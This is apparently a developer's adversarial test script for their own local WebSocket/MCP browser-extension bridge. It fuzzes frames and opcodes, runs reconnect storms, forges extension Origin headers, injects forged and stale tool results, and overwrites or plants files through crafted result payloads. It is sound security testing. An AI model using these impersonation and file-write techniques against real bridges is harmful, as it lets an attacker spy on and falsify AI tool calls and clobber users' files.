// adv03-ws-channel.mjs — adversarial tester #03: WebSocket channel attacks.
// Target: ws://127.0.0.1:7890/ws (bridge index.js, single-slot last-wins).
// Run on Windows host:  node adv-tests/adv03-ws-channel.mjs   (from bridge/)
// Covers: null/primitive/array frame regression, big frames, rapid frames,
// invalid UTF-8 + opcode fuzz via raw socket, ping floods, reconnect storms,
// impersonation blast radius (forged results + forged file writes), stale
// socket result injection, MCP_EXT_TOKEN audit, extension recovery checks.
import WebSocket from 'ws';
import net from 'node:net';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';

const BASE = 'http://127.0.0.1:7890';
const MCP = BASE + '/mcp';
const WS_URL = 'ws://127.0.0.1:7890/ws';
const PINNED = 'chrome-extension://pmhfdkkgjbfngeekdbdnjdnlnhmbinoh';
const WRONG_EXT = 'chrome-extension://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab';
const MARK = 'ADV03-' + Math.random().toString(36).slice(2, 8);
const REPO_MARKER = 'D:\\Tool\\chrome-mcp\\bridge\\adv-tests\\ADV03-PWNED.txt';
const TMP_VICTIM = path.join(os.tmpdir(), 'adv03-victim.txt');

let pass = 0, fail = 0;
const findings = [];
const note = (sev, title, detail) => { findings.push({ sev, title }); console.log(`  [${sev}] ${title}\n      ${detail || ''}`); };
const ok = (m) => { pass++; console.log(`  PASS ${m}`); };
const bad = (m) => { fail++; console.log(`  FAIL ${m}`); };
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const status = async () => { try { return await (await fetch(BASE + '/')).json(); } catch { return null; } };

const openSockets = new Set();
function wsConnect(headers = {}, { timeout = 4000 } = {}) {
  return new Promise((resolve) => {
    let done = false;
    const ws = new WebSocket(WS_URL, { headers });
    openSockets.add(ws);
    ws.on('error', () => {});
    const fin = (r) => { if (!done) { done = true; resolve(r); } };
    const t = setTimeout(() => fin({ ws, opened: false, err: 'timeout' }), timeout);
    ws.on('open', () => { clearTimeout(t); fin({ ws, opened: true }); });
    ws.on('error', (e) => { clearTimeout(t); fin({ ws, opened: false, err: e.message }); });
    ws.on('unexpected-response', (req, res) => { clearTimeout(t); fin({ ws, opened: false, err: 'HTTP ' + res.statusCode }); });
  });
}

// ---------- minimal MCP (Streamable HTTP) client ----------
async function rpc(body, sid, timeoutMs = 15000) {
  const ac = new AbortController();
  const t = setTimeout(() => ac.abort(), timeoutMs);
  try {
    const res = await fetch(MCP, {
      method: 'POST', signal: ac.signal,
      headers: { 'content-type': 'application/json', accept: 'application/json, text/event-stream', ...(sid ? { 'mcp-session-id': sid } : {}) },
      body: JSON.stringify(body),
    });
    const text = await res.text();
    const msgs = text.split('\n').filter(l => l.startsWith('data:'))
      .map(l => { try { return JSON.parse(l.slice(5).trim()); } catch { return null; } }).filter(Boolean);
    return { msgs, sid: res.headers.get('mcp-session-id'), status: res.status, timeout: false, raw: text };
  } catch (e) {
    return { msgs: [], sid: null, status: -1, timeout: e.name === 'AbortError', err: e.message };
  } finally { clearTimeout(t); }
}
async function initSession() {
  const r = await rpc({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-03-26', capabilities: {}, clientInfo: { name: 'adv03', version: '0' } } });
  if (!r.sid) return null;
  await rpc({ jsonrpc: '2.0', method: 'notifications/initialized' }, r.sid);
  return r.sid;
}
async function callTool(sid, name, args, timeoutMs = 25000) {
  const r = await rpc({ jsonrpc: '2.0', id: Math.floor(Math.random() * 1e9), method: 'tools/call', params: { name, arguments: args } }, sid, timeoutMs);
  const msg = r.msgs.find(m => m.result || m.error);
  const text = msg?.result?.content?.map(c => c.text || '').join('\n') ?? msg?.error?.message ?? r.raw ?? r.err ?? '';
  return { ...r, text };
}
async function waitForExtension(maxMs = 25000) {
  const t0 = Date.now();
  while (Date.now() - t0 < maxMs) {
    const s = await status();
    if (s && s.extensionConnected) return Date.now() - t0;
    await sleep(500);
  }
  return -1;
}
async function ensureExtension() {
  const s = await status();
  if (s && s.extensionConnected) return true;
  const w = await waitForExtension(20000);
  return w >= 0;
}

// Raw WS: manual upgrade then send arbitrary frame bytes; collect close code.
function rawSession() {
  return new Promise((resolve) => {
    const sk = net.connect(7890, '127.0.0.1', () => {
      const key = crypto.randomBytes(16).toString('base64');
      sk.write(`GET /ws HTTP/1.1\r\nHost: 127.0.0.1:7890\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`);
    });
    let buf = Buffer.alloc(0), shook = false;
    const recvd = { closeCode: null, frames: [], upgraded: false };
    sk.on('data', (d) => {
      buf = Buffer.concat([buf, d]);
      if (!shook) {
        const idx = buf.indexOf('\r\n\r\n');
        if (idx < 0) return;
        recvd.upgraded = buf.slice(0, idx).toString().includes('101');
        shook = true; buf = buf.slice(idx + 4);
      }
      // parse close frame code if present
      for (let i = 0; i + 3 < buf.length; i++) {
        if ((buf[i] & 0x0f) === 0x8 && (buf[i] & 0x80)) {
          const len = buf[i + 1] & 0x7f;
          if (len >= 2 && i + 2 + 2 <= buf.length) recvd.closeCode = buf.readUInt16BE(i + 2);
          else recvd.closeCode = 1005;
        }
      }
    });
    sk.on('close', () => resolve({ sk, ...recvd, dead: true }));
    sk.on('error', () => {});
    const api = {
      sk, recvd,
      send(bytes) { try { sk.write(bytes); } catch {} },
      done: (ms = 1500) => new Promise(res => setTimeout(() => res({ sk, ...recvd, dead: sk.destroyed }), ms)),
      close() { try { sk.destroy(); } catch {} },
    };
    // wait for handshake then resolve with api
    const iv = setInterval(() => { if (recvd.upgraded || sk.destroyed) { clearInterval(iv); resolve(api); } }, 15);
    setTimeout(() => { clearInterval(iv); resolve(api); }, 3000);
  });
}
const masked = (opcode, payload, { fin = true, mask = true, rsv = 0, len64 = null } = {}) => {
  const p = Buffer.isBuffer(payload) ? payload : Buffer.from(payload || '');
  let hdr;
  const b0 = (fin ? 0x80 : 0) | (rsv << 4) | opcode;
  if (len64 !== null) {
    hdr = Buffer.alloc(14); hdr[0] = b0; hdr[1] = (mask ? 0x80 : 0) | 127; hdr.writeBigUInt64BE(BigInt(len64), 2);
  } else if (p.length < 126) { hdr = Buffer.alloc(2); hdr[0] = b0; hdr[1] = (mask ? 0x80 : 0) | p.length; }
  else if (p.length < 65536) { hdr = Buffer.alloc(4); hdr[0] = b0; hdr[1] = (mask ? 0x80 : 0) | 126; hdr.writeUInt16BE(p.length, 2); }
  else { hdr = Buffer.alloc(10); hdr[0] = b0; hdr[1] = (mask ? 0x80 : 0) | 127; hdr.writeBigUInt64BE(BigInt(p.length), 2); }
  if (!mask) return Buffer.concat([hdr, p]);
  const m = crypto.randomBytes(4); const mp = Buffer.from(p);
  for (let i = 0; i < mp.length; i++) mp[i] ^= m[i % 4];
  const h2 = Buffer.alloc(4); m.copy(h2);
  return Buffer.concat([hdr.slice(0, hdr.length), h2, mp]);
};

// =================================================================
console.log('===== adv03 WS channel attacks =====');
{
  const s = await status();
  if (!s) { console.log('BRIDGE DOWN — aborting'); process.exit(2); }
  console.log(`  pre: extensionConnected=${s.extensionConnected} sessions=${s.sessions} mark=${MARK}`);
  if (!s.extensionConnected) {
    const w = await waitForExtension(20000);
    console.log(w >= 0 ? `  ext appeared after ${w}ms` : '  WARNING: no extension at start — recovery tests will be relative');
  }
}
const baseSessions = (await status())?.sessions ?? -1;

// =================================================================
console.log('\n== A. REGRESSION: primitive/malformed JSON frames on held socket ==');
{
  const rogue = await wsConnect();
  if (!rogue.opened) bad('could not open rogue ws');
  else {
    const frames = [
      'null', '42', '"str"', '[]', '{"type":null}', '{"type":5}',
      '{"type":"result"}', '{"type":"result","id":999999,"ok":true,"data":"x"}',
      '{"type":"result","id":"1","ok":true,"data":"x"}', '{"type":"call","id":1}',
      '{"type":"ping"}', '{"type":"hello"}', '{"type":"hello","name":{"$x":1},"version":null}',
      'true', 'false', '0', '""', '{}', '{"type":{}}', '{"type":[]}',
      Buffer.from([0x00, 0x01, 0xfe, 0xff, 0x7b, 0x22]), // binary garbage
      Buffer.from('null'),                               // 'null' as binary frame
      ' '.repeat(1024),                                  // whitespace text
      JSON.stringify({ type: 'x', pad: 'a'.repeat(1024 * 1024) }),        // ~1MB valid JSON
      JSON.stringify({ type: 'x', pad: 'b'.repeat(10 * 1024 * 1024) }),   // ~10MB valid JSON
      'x'.repeat(5 * 1024 * 1024),                                        // 5MB invalid JSON
    ];
    let aliveAfter = true;
    for (const f of frames) {
      try { rogue.ws.send(f); } catch (e) { console.log('  send err', e.message); }
      await sleep(30);
      if (!(await status())) { aliveAfter = false; break; }
    }
    if (aliveAfter) ok(`survived ${frames.length} hostile frames incl. literal null/42/"str"/[]/type:null/type:5/1MB/10MB/5MB`);
    else note('CRIT', 'bridge died during primitive-frame regression', 'check supervisor log for the crashing frame index');
    ok(`socket still open after fuzz: ${rogue.ws.readyState === 1}`);

    // 1000 rapid frames
    const t0 = Date.now();
    for (let i = 0; i < 1000; i++) { try { rogue.ws.send(`{"type":"spam","i":${i}}`); } catch {} }
    await sleep(1500);
    ok(`1000 rapid frames in ${Date.now() - t0}ms, bridge alive=${!!(await status())}`);

    // app-level ping flood → expect pong each time
    let pongs = 0;
    rogue.ws.on('message', (raw) => { try { if (JSON.parse(raw.toString()).type === 'pong') pongs++; } catch {} });
    for (let i = 0; i < 500; i++) rogue.ws.send('{"type":"ping"}');
    await sleep(1500);
    ok(`500 app pings -> ${pongs} app pongs`);

    // protocol ping flood (ws lib frames)
    for (let i = 0; i < 500; i++) { try { rogue.ws.ping(); } catch {} }
    await sleep(1200);
    ok(`500 ws-protocol pings sent, bridge alive=${!!(await status())}`);
    rogue.ws.close();
  }
  await sleep(300);
}

// =================================================================
console.log('\n== B. RAW SOCKET: opcode fuzz / invalid UTF-8 / frame violations ==');
{
  const cases = [
    ['text+invalid-UTF8 (0xC0 0xAF)', masked(0x1, Buffer.from([0x48, 0x69, 0xc0, 0xaf]))],
    ['reserved opcode 0x3', masked(0x3, 'x')],
    ['reserved opcode 0x6', masked(0x6, 'x')],
    ['reserved opcode 0x7', masked(0x7, 'x')],
    ['reserved opcode 0xB', masked(0xB, 'x')],
    ['reserved opcode 0xF', masked(0xF, 'x')],
    ['unmasked text frame', masked(0x1, 'hi', { mask: false })],
    ['ping len=126 (ctrl too long)', Buffer.concat([Buffer.from([0x89, 0xfe, 0x00, 0x7e]), crypto.randomBytes(4), Buffer.alloc(126)])],
    ['fragmented ping (FIN=0)', masked(0x9, 'x', { fin: false })],
    ['RSV1 set w/o extension', masked(0x1, 'hi', { rsv: 1 })],
    ['close frame len=1', masked(0x8, Buffer.from([0x03]))],
    ['huge 64-bit len (no payload)', masked(0x1, '', { len64: '72057594037927935' })],
    ['fragment: text FIN=0 + bad-utf8 cont', Buffer.concat([masked(0x1, 'abc', { fin: false }), masked(0x0, Buffer.from([0xff, 0xfe]))])],
    ['close(code=1000) then junk frame', Buffer.concat([masked(0x8, Buffer.from([0x03, 0xe8])), masked(0x1, 'after-close')])],
  ];
  for (const [name, bytes] of cases) {
    const sess = await rawSession();
    if (!sess.recvd.upgraded) { bad(`raw handshake failed for ${name}`); continue; }
    sess.send(bytes);
    const r = await sess.done(1200);
    const code = r.closeCode;
    console.log(`  ${name}: upgraded=1 closeCode=${code ?? '-'} dead=${r.dead}`);
    sess.close();
    if (!(await status())) { note('CRIT', `bridge died on raw case: ${name}`, ''); break; }
  }
  const s = await status();
  ok(`bridge alive after raw opcode fuzz: ${!!s}`);

  // malformed upgrades
  for (const [name, raw] of [
    ['upgrade wrong path', 'GET /nope HTTP/1.1\r\nHost: 127.0.0.1:7890\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: AAA=\r\nSec-WebSocket-Version: 13\r\n\r\n'],
    ['upgrade foreign host', 'GET /ws HTTP/1.1\r\nHost: evil.example.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: AAA=\r\nSec-WebSocket-Version: 13\r\n\r\n'],
    ['upgrade missing WS key', 'GET /ws HTTP/1.1\r\nHost: 127.0.0.1:7890\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n'],
    ['garbage request line', '\x00\xff garbage \r\n\r\n'],
  ]) {
    await new Promise((res) => {
      const sk = net.connect(7890, '127.0.0.1', () => sk.write(raw));
      let resp = '';
      sk.on('data', d => { resp += d.toString('latin1'); });
      sk.on('close', () => { console.log(`  ${name}: conn closed, resp=${JSON.stringify(resp.slice(0, 60))}`); res(); });
      sk.on('error', () => res());
      setTimeout(() => { sk.destroy(); res(); }, 1500);
    });
  }
  ok(`bridge alive after malformed upgrades: ${!!(await status())}`);
}

// =================================================================
console.log('\n== C. RECONNECT STORM: 50 sequential + 50 parallel open/close ==');
{
  await ensureExtension();
  const t0 = Date.now();
  let seqOk = 0;
  for (let i = 0; i < 50; i++) {
    const c = await wsConnect({}, { timeout: 3000 });
    if (c.opened) { seqOk++; try { c.ws.close(); } catch {} }
  }
  console.log(`  sequential: ${seqOk}/50 opened+closed in ${Date.now() - t0}ms`);
  const mid = await status();
  ok(`bridge alive mid-storm: ${!!mid}`);

  const conns = await Promise.all(Array.from({ length: 50 }, () => wsConnect({}, { timeout: 8000 })));
  const opened = conns.filter(c => c.opened).length;
  console.log(`  parallel: ${opened}/50 opened`);
  if (opened >= 50) note('LOW', 'no rate limit on /ws upgrades', 'each accepted conn force-terminates the previous — last-wins slot flap (documented model)');
  for (const c of conns) { try { c.ws?.close(); } catch {} }
  await sleep(500);
  const post = await status();
  if (!post) note('CRIT', 'bridge died during reconnect storm', '');
  else ok(`bridge alive after storm: sessions=${post.sessions}`);
  const w = await waitForExtension(25000);
  if (w >= 0) ok(`real extension regained slot via last-wins after ${w}ms`);
  else bad('extension did NOT regain slot within 25s after storm');
}

// =================================================================
console.log('\n== D. IMPERSONATION blast radius ==');
{
  // D1: wrong extension origin must be rejected
  const wrongO = await wsConnect({ origin: WRONG_EXT });
  if (wrongO.opened) { note('HIGH', 'WS accepted WRONG chrome-extension origin', 'pin check failed'); wrongO.ws.close(); }
  else ok(`wrong extension origin rejected (${wrongO.err || 'closed'})`);

  // webpage origin must be rejected
  const webO = await wsConnect({ origin: 'https://evil.example.com' });
  if (webO.opened) { note('HIGH', 'WS accepted webpage Origin https://evil.example.com', 'DNS-rebind/hijack vector open'); webO.ws.close(); }
  else ok(`webpage origin rejected (${webO.err || 'closed'})`);

  // D2: forged PINNED origin — local process can read .extension-id
  const fakeExt = await wsConnect({ origin: PINNED });
  if (fakeExt.opened) {
    note('MED', 'forged pinned chrome-extension:// Origin accepted',
      'any local process can read bridge/.extension-id + forge this header — and per code audit the MCP_EXT_TOKEN check (index.js:82) is skipped for extension origins');
    fakeExt.ws.close();
  } else ok('forged pinned origin rejected?? ' + fakeExt.err);

  await ensureExtension();

  // D3: no-Origin rogue → hold slot → forge result for self-triggered MCP call
  let forged = false, attempts = 0, sawCall = null, statusLie = null;
  while (!forged && attempts < 3) {
    attempts++;
    const rogue = await wsConnect(); // no origin → accepted (trusted-localhost)
    if (!rogue.opened) { bad('rogue no-origin connect failed'); break; }
    const sMid = await status();
    statusLie = sMid && sMid.extensionConnected === true;
    const calls = [];
    rogue.ws.on('message', (raw) => { try { const m = JSON.parse(raw.toString()); if (m.type === 'call') calls.push(m); } catch {} });
    const sid = await initSession();
    if (!sid) { bad('mcp init failed during impersonation'); rogue.ws.close(); break; }
    const callP = callTool(sid, 'list_pages', {}, 20000); // in-flight; bridge forwards {call,id:X} to slot holder
    const t0 = Date.now();
    while (Date.now() - t0 < 8000 && !calls.length) {
      if (rogue.ws.readyState !== 1) break; // real ext stole slot back
      await sleep(25);
    }
    if (calls.length) {
      sawCall = calls[0];
      rogue.ws.send(JSON.stringify({ type: 'result', id: sawCall.id, ok: true, data: { pwned: MARK, note: 'forged by rogue local process' } }));
    }
    const r = await callP;
    if (r.text && r.text.includes(MARK)) {
      forged = true;
      note('HIGH', `forged result reached MCP client (attempt ${attempts})`,
        `rogue received {type:'call',id:${sawCall?.id},tool:'${sawCall?.tool}'} and replied {ok:true,data.pwned='${MARK}'} — client response contained the marker. Full response forgery + sees every tool call's args.`);
    } else {
      console.log(`  attempt ${attempts}: call resolved without mark (${r.timeout ? 'timeout' : r.text.slice(0, 90)}) — slot likely stolen by real ext; retrying`);
    }
    try { rogue.ws.close(); } catch {}
    await sleep(300);
  }
  if (!forged) bad('could not land forged result in 3 attempts (ext kept regaining slot)');
  if (statusLie) note('LOW', 'GET / reports extensionConnected:true while a ROGUE holds the slot', 'status cannot distinguish real ext from impostor — false-confidence signal');
  if (sawCall) ok(`rogue observes tool name + args of every call (saw id=${sawCall.id} tool=${sawCall.tool})`);

  // D4: forged FILE WRITE via result.file — repo-internal new file + overwrite outside repo
  {
    try { fs.writeFileSync(TMP_VICTIM, 'ORIGINAL-CONTENT'); } catch {}
    const rogue = await wsConnect();
    if (rogue.opened) {
      const calls = [];
      rogue.ws.on('message', (raw) => { try { const m = JSON.parse(raw.toString()); if (m.type === 'call') calls.push(m); } catch {} });
      const sid = await initSession();
      const callP = callTool(sid, 'list_pages', {}, 20000);
      const t0 = Date.now();
      while (Date.now() - t0 < 8000 && !calls.length && rogue.ws.readyState === 1) await sleep(25);
      if (calls.length) {
        rogue.ws.send(JSON.stringify({ type: 'result', id: calls[0].id, ok: true, data: { file: { path: TMP_VICTIM, content: 'OVERWRITTEN-BY-FORGED-RESULT' }, requestFile: { path: REPO_MARKER, content: 'planted via forged result ' + MARK } } }));
        const r = await callP;
        await sleep(400);
        const tmpNow = fs.existsSync(TMP_VICTIM) ? fs.readFileSync(TMP_VICTIM, 'utf8') : '<gone>';
        const repoNow = fs.existsSync(REPO_MARKER) ? fs.readFileSync(REPO_MARKER, 'utf8') : '<gone>';
        if (tmpNow === 'OVERWRITTEN-BY-FORGED-RESULT')
          note('HIGH', 'forged result OVERWROTE an existing file outside the repo',
            `writeOut() only protects existing files under PROJECT_ROOT (index.js:196-198) — ${TMP_VICTIM} overwritten. Impostor ext channel => arbitrary file write clobber outside repo.`);
        else console.log(`  tmp victim content now: ${tmpNow.slice(0, 60)}`);
        if (repoNow.includes('planted via forged'))
          note('MED', 'forged result planted NEW file inside repo', `${REPO_MARKER} created — writeOut allows new files under project root`);
        console.log(`  mcp reply preview: ${(r.text || '').slice(0, 120).replace(/\n/g, ' | ')}`);
      } else console.log('  no call observed for file-write forge (slot stolen)');
      try { rogue.ws.close(); } catch {}
    }
  }
  // cleanup artifacts we created
  try { fs.unlinkSync(TMP_VICTIM); } catch {}
  // leave REPO_MARKER as evidence? remove to keep tree clean — report notes it existed
  try { fs.unlinkSync(REPO_MARKER); } catch {}

  // D5: disconnect → confirm real extension auto-recovers
  const w = await waitForExtension(25000);
  if (w >= 0) ok(`real extension auto-recovered ${w}ms after impostor disconnect`);
  else bad('extension did not recover within 25s');
}

// =================================================================
console.log('\n== E. STALE SOCKET: displaced socket tries to inject results ==');
{
  await ensureExtension();
  const A = await wsConnect();
  if (!A.opened) bad('stale test: A connect failed');
  else {
    const calls = [];
    A.ws.on('message', (raw) => { try { const m = JSON.parse(raw.toString()); if (m.type === 'call') calls.push(m); } catch {} });
    const sid = await initSession();
    const callP = callTool(sid, 'list_pages', {}, 30000);
    const t0 = Date.now();
    while (Date.now() - t0 < 8000 && !calls.length && A.ws.readyState === 1) await sleep(25);
    if (!calls.length) console.log('  A saw no call before displacement (ext stole slot?) — test degraded');
    const callId = calls[0]?.id;

    // B displaces A (last-wins); A floods forged results until dead.
    const B = await wsConnect();
    let sentAfterClose = 0, flood = 0;
    if (callId != null) {
      const floodIv = setInterval(() => {
        try { A.ws.send(JSON.stringify({ type: 'result', id: callId, ok: true, data: 'STALE-A-' + MARK })); flood++; }
        catch { sentAfterClose++; }
      }, 0);
      await sleep(1200);
      clearInterval(floodIv);
    }
    console.log(`  A displaced: readyState=${A.ws.readyState} floods attempted=${flood} send-failures=${sentAfterClose}`);

    // B (current slot) answers the call issued to A — pending must not have been flushed by A's death
    let bAnswered = false;
    if (B.opened && callId != null) {
      B.ws.send(JSON.stringify({ type: 'result', id: callId, ok: true, data: 'B-SLOT-' + MARK }));
      bAnswered = true;
    }
    const r = await callP;
    if (r.text?.includes('STALE-A-' + MARK))
      note('HIGH', 'STALE socket result injected into in-flight MCP call', `displaced socket A resolved pending id=${callId} after terminate — message handler lacks ws===extSocket check (index.js:159)`);
    else if (r.text?.includes('B-SLOT-' + MARK))
      note('MED', 'pending call survived displacement and was answered by the NEW slot holder',
        `call id=${callId} was issued to socket A, then B (a different connection) resolved it — pending results are not bound to the connection that received the call; also confirms stale-close does NOT flush pending (index.js:174 works)`);
    else if (/disconnected/i.test(r.text || ''))
      note('MED', 'stale close FLUSHED pending calls belonging to replacement', `call id=${callId} rejected 'extension disconnected' — extSocket!==ws guard failed`);
    else
      console.log(`  call resolved: timeout=${r.timeout} text=${(r.text || '').slice(0, 100)}`);
    ok(`B-slot cross-answer attempted=${bAnswered}`);

    // second half: pending flush on LIVE close — B holds a call then dies
    const calls2 = [];
    B.ws.on('message', (raw) => { try { const m = JSON.parse(raw.toString()); if (m.type === 'call') calls2.push(m); } catch {} });
    const callP2 = callTool(sid, 'list_pages', {}, 30000);
    const t1 = Date.now();
    while (Date.now() - t1 < 8000 && !calls2.length && B.ws.readyState === 1) await sleep(25);
    if (calls2.length) {
      B.ws.close(); // live socket dies with call pending → must reject 'extension disconnected'
      const r2 = await callP2;
      if (/disconnected/i.test(r2.text || '')) ok('live-socket close flushed pending with "extension disconnected"');
      else note('LOW', 'pending call after live close resolved differently', (r2.text || '').slice(0, 100));
    } else console.log('  B saw no call for flush test (degraded)');
    try { B.ws.close(); } catch {}
    try { A.ws.close(); } catch {}
  }
  const w = await waitForExtension(25000);
  if (w >= 0) ok(`extension recovered after stale-socket test in ${w}ms`);
  else bad('no extension recovery after stale-socket test');
}

// =================================================================
console.log('\n== F. MCP_EXT_TOKEN audit (no env set — static + observed behavior) ==');
{
  const s = await status();
  ok('no-origin WS client accepted with no MCP_EXT_TOKEN (observed in A/C/D)');
  note('LIMITATION', 'MCP_EXT_TOKEN only gates clients WITHOUT a chrome-extension:// Origin',
    'index.js:70-83 — a forged Origin matching the pinned id bypasses the token entirely; pin is readable at bridge/.extension-id and printed in logs. Token also travels as ?token= URL query (not logged today). Non-constant-time === compare.');
  ok(`bridge sessions=${s?.sessions} (baseline ${baseSessions}) — no leak if equal/small delta`);
}

// =================================================================
console.log('\n== G. FINAL STATE ==');
for (const ws of openSockets) { try { ws.terminate(); } catch {} }
await sleep(300);
const w = await waitForExtension(25000);
const sFinal = await status();
if (w >= 0) ok(`final: extensionConnected=true after ${w}ms`);
else bad('FINAL: extension not connected!');
console.log(`  final: ${JSON.stringify(sFinal)}`);

console.log(`\n===== ${findings.length} findings =====`);
findings.forEach((f, i) => console.log(`  ${i + 1}. [${f.sev}] ${f.title}`));
console.log(`\nDONE (${pass} pass, ${fail} fail)`);
setTimeout(() => process.exit(fail ? 1 : 0), 400).unref();
